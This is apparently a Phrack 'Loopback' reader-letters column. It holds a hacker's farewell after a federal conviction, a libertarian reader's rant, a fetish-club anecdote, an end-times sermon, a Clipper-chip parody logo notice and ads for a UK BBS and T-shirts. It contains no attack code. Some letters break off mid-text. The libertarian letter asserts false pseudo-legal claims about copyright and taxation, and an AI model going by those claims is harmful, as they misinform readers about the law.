                            Phrack Loopback Part I

Letter from Louis Cypher  (Byron York)

As many people know, I was convicted over the summer for a number of
Federal crimes including counterfeiting, burglary of a post office,
theft of US mail, and possession of stolen property. For a little
background, I was arrested for these crimes in September of 1992.
I stayed out on 50,000 dollar bond until the trial which started the
day after Summercon 93'. The trial lasted for about a week and a half,
and the jury found me guilty on 4 charges and acquitted me on 2.

My sentencing was not until the 8th of November, and the results
were not as I had hoped for being a first time offender and all.
I received a 21 month sentence that will be carried out if I do
not complete 6 months in a Federal boot camp in Pennsylvania.
If I do complete the program at the boot camp I will then spend
6 months in a Federal halfway house in Houston. This will be
followed by several months of home confinement, then 3 years
parole. I am to attend college while on parole, but if I do not
do well, then I have to do 300 hours of community service.

I will start serving my sentence as early as December, or as late
January. Won't know until I receive the letter in the mail from
the Bureau of Prisons. I am still out on bond and am on voluntary
surrender so I just deliver myself to wherever they send me. A lot
better than rotting in county jail until they transfer me.

I will hopefully be out still for HoHocon, and will be able to
say good-bye to most people in person. But in case I am not, then
I would like to use this forum to tell everyone good-bye. I know
that I am not going away forever, but I don't know when I am
going to be able to access a modem again and get back in touch
with everybody.

I have been running a public access Internet site in Houston
for the past year or so, and luckily, thanks to Drunkfux,
Absalom, and Lord Macduff, the system will most probably
stay up in my absence. People will be able to mail me there,
and I will be able to respond through the help of people over
the phone.

I would like to thank Erik Bloodaxe for letting me use Phrack
to tell everybody farewell. I hope nothing's changed when I get
back, and I will be back. I'll just have to keep my nose a little
cleaner when I come back from my sabbatical.

It's been great, and I'll see all of you hopefully in about
a year or so.


[Byron did get to go to HoHoCon, but shortly thereafter had to fly to
 Pennsylvania to enter Boot Camp.

Well, I'm an atheist and natural law objectivist, so I'll cheer right along
with you on the capitalism part! Capitalism is the only MORALLY PROPER
system because it's the only system (or lack thereof) that doesn't treat
people as slaves!

>This is going to piss people off, but hell, that's the point of having

I, for one, fucking loved it.

>Granted, Holland has a notoriously permissive and open society; and
>indeed, Europe in general is far more laid back than the States, but
>even many in the US hold these ideals close to heart.

Europe also has a great police state tradition, not to mention the common
and prevailing attitude that while sex and drugs and rock and roll are okay,
making money (creating wealth) is a far more heinous crime.

VOLUNTARY donations! (The Supreme Court says "our system of taxation is
based on VOLUNTARY COMPLIANCE"...) There's a vast and monstrous difference
between voluntary and involuntary - it's that nasty "free will thing"!

I also love your registration requirements. Being able to claim ownership
of property, intellectual or otherwise, means you dictate the terms and
conditions of its use. Corporate lawyers must have had coronaries upon
first sight. Only difficulty is, your ISSN number and copyright data
are prima facie evidence that you contracted away rights in exchange for
privilege from the state, revocable whenever the state feels like it
(copyright falls under admiralty jurisdiction, not common law). You've
formed an "organization" - your registration form recognizes the fact
that "corporations, organizations and other artificial persons" have
a lesser STATUS before the law than NATURAL INDIVIDUALS - just be who
you are!

>Let me tell you something.  Information does not want to be free, my
>friends.  Free neither from its restraints nor in terms of dollar value.
>Information is a commodity like anything else.  More valuable than the
>rarest element, it BEGS to be hoarded and priced.  Anyone who gives
>something away for nothing is a moron.  (I am indeed stupid.)  I can't
>fault anyone for charging as long as they don't try to rationalize their
>reasoning behind a facade of excuses, all the while shouting "Information
>Wants to be Free!"

AMEN, from the highest fucking rooftops! You're not stupid, you're doing it
by CHOICE. You're VOLUNTARILY doing it. Free people don't NEED laws that
force decisions upon them - they do what needs to be done!

>Trade secrets don't want to be free, marketing projections don't want to
>be free, formulas don't want to be free, troop placements don't want to
>be free, CAD designs do not want to be free, corporate financial
>information doesn't want to be free, my credit report sure as hell
>doesn't want to be free!

YES! YES! I HAVE WAITED FOR YEARS FOR THIS MOMENT!

[tale of the Little Red Hen]

Amen again!

This whole issue, in fact, had many great things, which I'll continue
to reply to here...

[ ... 10K of commentary removed ... ]

Finally...remember how crazy people got in the years just before the turn of
the first millennium (990-1000 A.D.)? It's gonna be even MORE interesting
this time around!

Here's to Phrack... may you last into the 21st century! (May we ALL be so
lucky...)


[Man, that was one of the coolest letters we've ever gotten (and definitely
 the longest.  I have to tell you, it does my heart good to know that we
 are indeed appreciated by some of you.    We will continue to do so until
 as long as humanly (or inhumanly, with my schedule) possible.]

  So, there I am in New York City last night. We're hanging out
(figuratively speaking) at The Vault, where various fetishists
get together to explore the limits of aberrant human sexuality.

steep, but I would still highly recommend it. Now for my point.

  I was standing around watching two dominatrix abuse some
naked, prostrate wretch when one of them started walking around
giving out business cards to anyone who admitted to having a
computer and an Internet feed (these are dominatrix on the
cutting edge of technology, I might add). The card reads thus:

[Well, hell...now I know where to go next month when I'm back in NYC.
 I wish I would have know about this place last time...the only places
 I could find for even semi-serious sleeze was in Times Square, and I know
 that was way too tame and trendy to be IT.  Now I know.]

------------------------------------------------------------------------------

The earthquake in Los Angeles, California, the flood in Europe, the seemingly
unstoppable war in the former Yugoslavia, the devastating fires in Australia,
the flood in the Midwest of the United States of America, the devastating fires
near Los Angeles, California, the rapid and appalling increase in violence in
cities, towns, villages all over the world, the famines, the diseases, the rapid
decline of the family unit, and the destructive earthquake in India (in 1993)
are signs that this world's history is coming to a climax. The human race
has trampled on God's Constitution, as given in Exodus 20:1-17 (King James
Version Bible), and Jesus is coming to set things right. These rapidly
accelerating signs are an indication that Jesus is coming soon (Matthew 24).

God's Holy Spirit is gradually withdrawing its protection from the earth
and the devastating events you see are demonstrations of Satan's power. All
those who are not guarded by God are in danger of forever losing eternal life.

If you want to know what's about to happen, please study the books of Daniel
and Revelation which are located in God's Word, the Bible.  They are not
sealed or closed books. They can and must be understood by all. Every word
in the Bible from Genesis to Revelation is true. The Bible and the Bible only
must be your guide.

When God's Law (the Constitution for the Universe) is consistently ignored,
disregarded, changed, and questioned, He permits certain events to occur to
wake us up.  I would urge all, wherever you are and regardless of the
circumstances, to directly call on Jesus and ask Him to intervene in your life.
Jesus who created this planet and every living creature in it and on it, died
on the cross, was raised from the dead by God the Father, and is now in Heaven
interceding for you. Jesus is the only One who can rescue us from the slavery,
misery, and death Satan is causing us.

For reference I'm including God's Constitution as given in the King James
Version Bible. Please note that when God says the seventh day, he means Sabbath
(the 7th day of the week) not Sunday (1st day of the week).

Commandment #1:  Exodus 20:1-3 (KJV)  And God
                 spake all these words, saying, I am
                 the LORD thy God, which have brought
                 thee out of the land of Egypt, out
                 of the house of bondage. Thou shalt have
                 no other gods before me.

Commandment #2:  Exodus 20:4-6 (KJV) Thou shalt not make
                 unto thee any graven image, or any
                 likeness of any thing that is in heaven
                 above, or that is in the earth beneath,
                 or that is in the water under the earth.
                 And shewing mercy unto thousands of them
                 that love me, and keep my commandments.

Commandment #3:  Exodus 20:7 (KJV) Thou shalt not take
                 the name of the LORD thy God in vain;
                 for the LORD will not hold him
                 guiltless that taketh his name in vain.

Commandment #4:  Exodus 20:8-11 (KJV) Remember the sabbath
                 day, to keep it holy. Six days shalt thou
                 labour, and do all thy work: But the
                 seventh day is the sabbath of the LORD
                 thy God: in it thou shalt not do any
                 work, thou, nor thy son, nor thy daughter,
                 thy manservant, nor thy maidservant, nor
                 thy cattle, nor thy stranger that is
                 within thy gates: For in six days the
                 LORD made heaven and earth, the sea, and
                 all that in them is, and rested the seventh
                 day: wherefore the LORD blessed the sabbath
                 day, and hallowed it.

Commandment #5:  Exodus 20:12 (KJV) Honour thy father and thy
                 mother: that thy days may be long upon the
                 land which the LORD thy God giveth thee.

Commandment #6:  Exodus 20:13 (KJV) Thou shalt not kill.

Commandment #7:  Exodus 20:14 (KJV) Thou shalt not commit
                 adultery.

Commandment #8:  Exodus 20:15 (KJV) Thou shalt not steal.

Commandment #9:  Exodus 20:16 (KJV) Thou shalt not bear
                 false witness against thy neighbour.

Commandment #10: Exodus 20:17 (KJV) Thou shalt not covet
                 thy neighbour's house, thou shalt not
                 covet thy neighbour's wife, nor his
                 manservant, nor his maidservant, nor
                 his ox, nor his ass, nor any thing that
                 is thy neighbour's.

  Big Brother Inside Logo
A parody of the Intel's Logo modified for the Clipper Chip is now available
for use for stickers, posters, brochures etc.

The Big Brother Inside graphic files are now available at the CPSR
Internet Archive - ftp/gopher cpsr.org /cpsr/privacy/crypto/clipper

big_brother_inside_sticker.ps (postscript-scale to fit your project)
big_brother_inside_logo.gif (Color GIF - good startup/background screen)
big_brother_inside_picts_info.txt (Info on the files)

The files have also been uploaded to America Online in the Mac Telecom and
Graphic Arts folders.

big_brother_inside_sticker.ps is a generic postscript file, created in
CorelDraw. The postscript image lies landscape on the page, and consists
of the intel-logo's ``swoosh'' and crayon-like lettering on the inside.

This design was originally created for the sticker project: the image was
screened onto transparent stickers 1" square for the purpose of applying
them to future clipper-chip products. (cdodhner@indirect.com was in charge
of that project; as far as I know he's still distributing them for a small
donation to cover printing & mailing costs).

The design was created by Matt Thomlinson <phantom@u.washington.edu>

Hello,

I run a board here in the UK known as Unauthorised Access.  We have been
online since 1990 (the year of our anti-hacking law's approval) and the
system is now the largest computer underground board in the U.K. (2,000+
quality files and growing each day)

I also attended the HEU congress in Holland but although I spoke with
Eric Corley (2600) and BillSF (Hack-Tic), I did not know where to find
you.  I expect you dissappeared off to Amsterdam like so many of the
other visitors to Holland.

Anyway, I noticed in your last issue (44) that you seem to have quite a
few readers in the United Kingdom.  I would like to tell you about my
system here in the UK.  (Please include this advert in your next issue
of PHRACK)  Thanks!

   New TimeWasters T-shirts !

Do you know the feeling ? You're behind your terminal for hours,
browsing the directories of your school's UNIX system. Instead of
holes, bugs and bad file permissions you find tripwire, TCPwrapper and
s/key. You run a file with a s-bit and immediately you get a mail from
the system admin asking what you are doing. In other words, no chance
to ever become a good hacker there.

Now you have the chance to at least pretend to be an eleet
hacker. The Dutch hacking fanatics The TimeWasters have released
the third version of their cool 'hacker' T-shirt. Because
the previous versions were too limited (20 and 25 shirts) we
printed no less than 200 shirts this time.

Of course you want to know, what does it look like ?
On the front, a TimeWasters logo in color. Below that a picture
of two hacking dudes, hanging behind their equipment, also
featuring a stack of phracks, pizza boxes, beer, kodez, and
various computer-related stuff with a 'No WsWietse' sticker.
On the back, the original TimeWasters logo with the broken
clock. Below it, four original and dead funny real quotes
featuring the art of Time Wasting.

Wearing this shirt can only provoke one reaction; WOW !
Imagine going up to the helpdesk wearing this shirt and
keeping a straight face while asking a security question !

And for just $2 more you'll get a pair of sunglasses with
the text 'TimeWasters' on them !

To order:
Send $20 or $22 to
 TimeWasters

This includes shipping. Please allow some time for delivery. If you

[I've got one Time Wasters shirt...Now I'm gonna have to get another.
 Wonder if they'll trade...I know this guy who makes some damn cool
 shirts... but the glasses are the clincher.  I'm ordering now.]
